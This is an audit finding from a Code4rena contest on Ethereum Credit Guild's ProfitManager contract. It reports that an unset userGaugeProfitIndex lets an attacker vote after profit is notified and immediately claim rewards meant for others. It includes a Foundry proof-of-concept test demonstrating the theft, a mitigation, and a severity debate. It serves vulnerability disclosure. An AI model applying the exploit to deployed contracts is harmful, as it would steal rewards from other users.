[H-01] TheuserGaugeProfitIndexis not set correctly, allowing an attacker to receive rewards without waiting
Submitted byArz, also found bydeliriusz,Infect3d,Neon2835,AlexCzm,evmboi32,Chinmay,0xpiken,0xStalin,sl1,almurhasan,HighDuty, Tendency (1,2),zhaojohnson,c47ch3m4ll,JCN,santipu_,asui,kaden,TheSchnilch,klau5, ether_sky (1,2), andcritical-or-high
WhenclaimGaugeRewards()is called for the first time before the user votes for a gauge, theuserGaugeProfitIndexshould be set to the currentgaugeProfitIndex, later when thegaugeProfitIndexgrows the user will be able to claim the rewards.
The problem here is that the first timeclaimGaugeRewards()is called theuserGaugeProfitIndexis not set to anything because of this check:
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L416-L418
416:if(_userGaugeWeight==0) {417:return0;418:  }
So an attacker can vote for a gauge after profit is notified,claimGaugeRewards()will be called for the first time inincrementGauge(); however, theuserGaugeProfitIndexwill not be set and will be0.
The attacker will then callclaimGaugeRewards()again and because theuserGaugeProfitIndex== 0it will be set to 1e18. Since thegaugeProfitIndexis bigger than 1e18, the attacker will receive rewards without waiting.
Impact
The attacker will receive rewards without waiting and can repeat this until all rewards are stolen. Other users will then fail to claim their rewards and will receive nothing.
Proof of Concept
Add this toProfitManager.t.solandimport "@forge-std/console.sol";
As you can see, the attacker will be able to steal rewards in the same transaction.
functiontestAttackClaimAfterProfit()public{addressattacker=makeAddr("attacker");vm.startPrank(governor);core.grantRole(CoreRoles.GOVERNOR,address(this));core.grantRole(CoreRoles.CREDIT_MINTER,address(this));core.grantRole(CoreRoles.GUILD_MINTER,address(this));core.grantRole(CoreRoles.GAUGE_ADD,address(this));core.grantRole(CoreRoles.GAUGE_PARAMETERS,address(this));core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER,address(this));vm.stopPrank();vm.prank(governor);profitManager.setProfitSharingConfig(0,// surplusBufferSplit0.5e18,// creditSplit0.5e18,// guildSplit0,// otherSplitaddress(0)// otherRecipient);guild.setMaxGauges(1);guild.addGauge(1,gauge1);guild.mint(attacker,150e18);guild.mint(bob,400e18);vm.prank(bob);guild.incrementGauge(gauge1,400e18);credit.mint(address(profitManager),20e18);profitManager.notifyPnL(gauge1,20e18);//Attacker votes for a gauge after it notifies profit//The userGaugeProfitIndex of the attacker is not setvm.prank(attacker);guild.incrementGauge(gauge1,150e18);//Because the userGaugeProfitIndex is not set it will be set to 1e18//The gaugeProfitIndex will be 1.025e18 so the attacker will steal the rewardsprofitManager.claimGaugeRewards(attacker,gauge1);console.log(credit.balanceOf(attacker));//Other users will then fail to claim their rewardsvm.expectRevert(bytes("ERC20: transfer amount exceeds balance"));profitManager.claimGaugeRewards(bob,gauge1);console.log(credit.balanceOf(bob));}
Tools Used
Foundry
Recommended Mitigation Steps
WhenuserGaugeProfitIndexequals0it should be set to the currentgaugeProfitIndexand it should be set the first timeclaimGaugeRewards()is called.
eswak (Ethereum Credit Guild) confirmed, but disagreed with severity and commented via duplicate issue #1211:
Disputing severity (I think it’s more fit for medium because there is no loss of user funds, just rewards).
TrungOre (judge) commented via duplicate issue #1211:
I consider this issue a high severity because the rewards in ProfitManager are matured yield, which should be distributed to the intended users. The loss of matured yield is considered a high-severity issue based on C4’s criteria.